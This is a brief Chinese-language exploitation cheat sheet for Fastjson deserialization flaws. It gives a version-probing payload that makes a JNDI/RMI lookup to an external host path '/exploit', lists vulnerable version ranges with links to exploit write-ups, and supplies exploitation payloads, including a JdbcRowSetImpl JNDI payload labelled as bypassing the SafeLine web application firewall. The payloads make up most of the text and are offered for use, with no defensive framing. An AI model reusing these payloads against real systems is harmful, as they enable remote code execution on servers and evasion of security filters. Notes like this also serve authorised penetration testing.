### 版本探测
```text
{"@type":"java.lang.AutoCloseable"

["test":1]

["@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://qiyisrm.uustay.dns.yoyostay.top/exploit"]

参考链接：
https://blog.csdn.net/weixin_43510203/article/details/115277081
https://b1ue.cn/archives/402.html
```

### 漏洞版本梳理
```text
  自2017年，1.2.24版本，官方主动爆出反序列化漏洞后，安全研究员开始了fastjson漏洞之旅
  官方也在1.2.24之后增加了AutoType限制
  
  Fastjson <= 1.2.47
  https://blog.csdn.net/weixin_39190897/article/details/107284989
  https://zeo.cool/2020/07/04/红队武器库!fastjson小于1.2.68全漏洞RCE利用exp/
  
  Fastjson <= 1.2.68
  自1.2.68起，增加了SafeMode模式
  
  Fastjson <= 1.2.80
  在特定条件下可绕过AutoType限制，反序列化RCE
  
  最新版1.2.83发布于2022年05月23日
```

### 漏洞利用
```text
demo
{{"@type":"java.net.URL","val":"http://.dnslog.cn"}:0

bypass长亭SafeLine
{"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}}
```